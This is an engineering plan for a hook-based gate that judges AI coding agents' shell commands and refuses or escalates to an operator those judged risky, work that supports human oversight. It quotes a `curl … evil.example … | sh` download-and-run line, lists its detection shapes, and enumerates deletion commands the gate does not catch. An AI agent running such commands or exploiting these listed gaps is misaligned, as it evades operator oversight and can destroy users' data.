<objective>
GATE-03: judge a tool call in main against the **actual command string**, on every hook-bridged engine.

**Purpose, and why this is a widening rather than a new gate.** D-02 is emphatic and the source argues its
own case. `HookServer.protectedPathDenial` (`src/main/hooks.ts:860`) already runs in main, is reached by
every hook-bridged engine, tokenizes the real Bash command string, resolves candidates to `(dev, ino)`
identity rather than matching spellings, caps candidates at `HOOK_CANDIDATE_MAX`, and returns an
operator-legible reason. Its own header at `hooks.ts:787-799` states why it is not in `AGENT_DENY_RULES`:
*"That list does not exist for the agy/codex/grok engines that reuse this very shim, and its `Bash(...)`
rules are prefix matches on the command string. This gate is strictly wider on both axes and lives at the
choke point every hook-bridged engine already routes through."* That is GATE-03's thesis, already written
in the codebase.

**But `protectedPathDenial` is the wrong host for the predicate, and RESEARCH measured why.** L-01:
`hooks.ts:890` reads `if (targets.length === 0) return null;`. `curl https://evil.example/x | sh` contains
no `pathShaped` word (`hooks.ts:299`), so the function exits before the candidate loop. **A plan that reads
D-02 as "add a branch inside `protectedPathDenial`" ships a gate that never sees two of the four shapes.**
So: a **second judge over the same tokens**, called from the same PreToolUse block, placed **before**
`protectedPathDenial`.

**D-01 — GATE-03 and GATE-05 are the same seam, and this plan is the first half of it.**
`ControlRegistry.toolDecision` (`control.ts:97`) is the only per-tool-call verdict in main; GATE-03 needs it
to judge the string and GATE-05 needs it to have a third answer. Two plans editing that one function in two
ways is a merge conflict by construction. They are sliced as **one owner in strict sequence**: this plan
owns `hooks.ts` and the judge in wave 2; plan 04-15 owns `hooks.ts` and `control.ts`'s third answer in
wave 4. **Do not pre-build GATE-05's ask branch here** — S-1 says there is nowhere for "ask" to hang until
"deny for this shape" exists.

**D-03 — `AGENT_DENY_RULES` stays.** `hiveProvisioning.ts:63` is defence in depth: it is the only rule
surface that survives `--permission-mode bypassPermissions` inside Claude's own process, so it fires
before a hook round trip. Keep it, change it not at all here, and mark **no** success criterion green on
its behaviour — it is written into exactly one engine's settings file.

**The entry condition is the command string, not the tool name, and this is the difference between a gate
and a decoration.** `hooks.ts:871` reads `if (p.tool_name === 'Bash' && typeof ti.command === 'string')`.
`Bash` is **Claude Code's** tool name. Repo-wide, `grep -rn "'Bash'" src/main/ src/shared/` returns exactly
two hits — that line and an unrelated `disallowedTools` list at `reflect.ts:354` — so **no normalization
exists anywhere in this codebase.** Every non-Claude bridge forwards its engine's own name unmapped:
`tc.name` (agy, `hiveTemplates.ts:386`), `grok.toolName` (`:765`), `ev.name || ev.tool.name` (pi, `:444`),
`input.tool || input.name` (opencode, `:485`), and codex's shell tool is not called `Bash` either. A judge
that reproduces `:871`'s condition verbatim **refuses nothing on codex, grok, pi, OpenCode, kimi or agy**
— six of the seven engines main can reach — while every unit test stays green.

**And the same is true of the arm that is already there, which the first two revisions froze instead of
fixing.** The earlier draft asserted `grep -c "p.tool_name === 'Bash'"` returns **1, unchanged** — pinning
`protectedPathDenial`'s command-tokenizing arm as Claude-only *permanently, by test*. Measured at
`hooks.ts:862-889`: on codex, grok, pi, OpenCode, kimi and agy that function collects targets only from
`ti.file_path` / `ti.path` / `ti.notebook_path` — Claude's key names — never from the command string. So on
six of seven engines `mv <hive>/restore /tmp`, `cat > <hive>/bin/task.cjs` and
`cp <hive>/agents/other/inbox/* .` all reach `targets.length === 0 → return null` → **ALLOW**. That makes
the `restore` literal this same task adds a protection **against Claude agents and nothing else**, and it
makes T-04-SNAP-08's `mitigate` disposition false. **So this task widens BOTH arms**: the new one is
written with the command-presence condition, and `:871`'s is changed to the same condition. `p.tool_name`
survives in both, for the audit record and for the `emitControl` payload — it is simply not the gate.

**`ti.command` is not necessarily a string, and nothing in this repo ever said it was.** Codex's `shell`
tool takes `command` as an argv **array** (`["bash","-lc","rm -rf ./x"]`). `hiveProvisioning.ts:160`
vouches only that codex's hook *envelope* is Claude-shaped; it says nothing about this field. If the value
arrives as an array, `typeof ti.command === 'string'` is false, **both** arms exit, and GATE-03 refuses
nothing on codex — while every test stays green and plan 04-10's honest claim already says "refused for
Codex-shaped payloads". The plan does not guess codex's spelling and does not need to: **it accepts both
shapes** and asserts the array form directly.

**GATE-05's third answer is authored HERE, and `toolDecision` is not widened.** D-01 read
`ControlRegistry.toolDecision` (`control.ts:97`) as "the only per-tool-call verdict in main" and therefore
as the natural home for `ask`. That premise stops being true the moment this plan lands: `commandShapeDenial`
is a per-tool-call verdict that sees the command string, which is exactly what `toolDecision` never sees
(it reads only `paused` and `gatedTools`). And this judge runs **before** the `toolDecision` guard at
`hooks.ts:1387`, so a shape routed to `ask` by `toolDecision` could never be reached anyway. Widening
`toolDecision` would also turn the operator's race-free immediate tool-gate deny into a 120 s wait — a
fail-direction regression for a feature nobody asked to change. **Decision, binding on plan 04-15:
`toolDecision` keeps its `{deny, reason}` shape; `ask` is a `commandShapeDenial` verdict kind.**

<planner_decisions>
**D-04 never settled which shapes ask and which deny, and GATE-05's own use case depends on it. Settled
here, in writing, reasoned against GATE-05's own wording.** The rule is asymmetry of consequence: an
operator answering at 3am on a phone sees a command string and a countdown, nothing else.

| Shape | Verdict | Why |
|---|---|---|
| `git push` + force (`+ref`, `--force`, `-f`, `--force-with-lease`) | **ask** | Frequently legitimate — a rebased branch has to be force-pushed. The operator can judge it from the command string alone, which is exactly what the ask hands them. Denying outright makes a normal git workflow permanently impossible for every agent. A mistaken "no" costs one retry. |
| downloader piped to an interpreter (`curl … \| sh`) | **ask** | Occasionally legitimate — `curl https://sh.rustup.rs \| sh` is how several toolchains install. The URL is in the command string the operator reads. Denying outright blocks a real install path with no way through. |
| host outside a **non-empty** allowlist | **ask** | This is how the operator learns the list. `DEFAULT_HOST_ALLOWLIST` is `[ASSUMED]` (RESEARCH A1) and will be wrong; the ask is A1's own mitigation — *"let the operator's first denial teach them"* — made answerable instead of merely instructive. |
| `rm` + **any** recursive flag (`-r`, `-R`, `--recursive`, or a combined `-rf`/`-fr`/`-Rf`), with or without `-f` | **ask** | **Reversed in round 3, and this is the correction that mattered.** GATE-05's requirement is verbatim *"an agent about to run something **unrecoverable** stops, the operator is asked"* — and under the previous draft the one unrecoverable shape was the only one that never asked. Three further things broke the deny: (1) the deny reason **named its own bypass** — "use `rm` without `-rf`" — and `rm -r ./build` deletes the identical tree, with no tty and therefore no prompt to save anything in a non-interactive agent shell; (2) the stated justification (*"the operator cannot evaluate blast radius from the token list"*) does not survive contact, because the **deny** is issued from that same token list with no more information and the desktop surface renders the full command anyway; (3) the plan's own test for choosing `ask` is *"denying outright blocks a real path with no way through"*, and `rm -rf node_modules` / `.next` / `build` is far more frequent in an overnight run than `curl … \| sh`. The shape is also **widened**: `-f` adds nothing to the danger, so any recursive flag matches. The bypass sentence is **deleted** from the reason string. |
| host token when the allowlist is **empty or unparseable** | **deny** | **D-05, unsoftened (M4).** An operator who deliberately emptied the list has said *"no hosts"*; asking them once per host at 3am is the fatigue this gate exists to avoid, and an ask that nobody answers expires to a deny anyway — two minutes later and one push noisier. This is the one shape that produces `kind:'deny'`, which is what keeps that arm live, tested and available as the contrast case plans 04-15 and 04-20 assert against. (An **absent** getter is a different fact and takes `DEFAULT_HOST_ALLOWLIST` — see below.) |

Four of the five ask, so the ask path is genuinely exercised rather than shipping green and unused — which
is the defect this decision exists to prevent — and exactly one produces a deny, so the deny arm is not
dead code and there is a real bare-deny to contrast an ask against.

**The deletion spellings this gate does NOT judge, enumerated rather than left to a reader to discover:**
`find . -delete`, `find … -exec rm {} \;`, `git clean -xfd`, `shred`, `truncate -s0`, `> file`,
`dd of=`, `Remove-Item -Recurse`, and anything a runtime-assembled string produces. Ceiling item (t).

**The verdict type, and how it reaches an ask before plan 04-15 exists.**

```ts
export type ShapeVerdict = { kind: 'deny' | 'ask'; reason: string };
export function commandShapeDenial(
  words: readonly string[], rawCommand: string,
  hostAllowlist: readonly string[] | null | undefined
): ShapeVerdict | null;
```

`HookServer` gains an **optional trailing constructor argument**
`openAsk?: (a: {agentId: string; tool: string; command: string; reason: string}) => unknown`. When the
verdict is `ask` **and** `openAsk` is present, the call site delegates to it and returns whatever it
returns. When `openAsk` is **absent**, an `ask` verdict is answered as a **deny** carrying the same reason.
That is not a temporary state to clean up later — it is the correct behaviour for a floor with no approval
transport, and it is the same fail-closed direction the whole gate takes. Plan 04-15 supplies `openAsk`;
plan 04-20 wires it at the production composition root.

**The absent-getter case is the DEFAULT set, not deny — and that does not weaken D-05.** The host arm's
allowlist argument is `this.hostAllowlist?.() ?? DEFAULT_HOST_ALLOWLIST`. D-05's fail-closed rule is about
an allowlist the operator has **configured to be empty** — an explicit act, an operator who has told us
nothing about hosts — and that still **denies**, not asks. An absent getter is a different fact: it means
the composition root has not wired the config yet (waves 2 to 4), and answering it by refusing every
outbound host would break `curl https://registry.npmjs.org/...` on every agent for three waves.
`DEFAULT_HOST_ALLOWLIST` is non-empty, so D-05's failing-closed branch is still reached only by someone who
deliberately emptied the list — which is exactly what D-05 says.

**And there is a second window this plan must state out loud, because until wave 5 it is a hard deny with
no operator recourse.** From this plan landing (wave 2) until plan 04-20 wires `openAsk` (wave 5), an `ask`
verdict with no `openAsk` present is answered as a **deny**. So during waves 2, 3 and 4 — including plan
04-13 task 4's live codex run in wave 4 — every unlisted host, every force-push and every `curl … \| sh` is
refused outright. Three consequences, all owned:

1. **`DEFAULT_HOST_ALLOWLIST` must be wide enough to survive that window.** The first draft's set was
   missing the hosts an overnight run actually reaches. Round 3 adds `api.github.com`, `nodejs.org`,
   `sh.rustup.rs`, `get.docker.com`, `astral.sh`, `deb.debian.org`, `security.debian.org`,
   `archive.ubuntu.com`, `install.python-poetry.org`, `bun.sh` and `deno.land`. Still `[ASSUMED]`, still
   incomplete, and still the operator's to extend — but no longer missing the obvious.
2. **Plan 04-13 task 4 records whether a host denial interfered with its live run**, so the window is
   observed rather than assumed harmless.
3. **Plan 04-20 task 2 re-checks the behaviour after `openAsk` is wired** — a denied host must come back
   as a `hive_ask`, not as the bare deny it was in waves 2-4. Without that criterion nothing in the phase
   ever confirms the wave-2 behaviour changed.
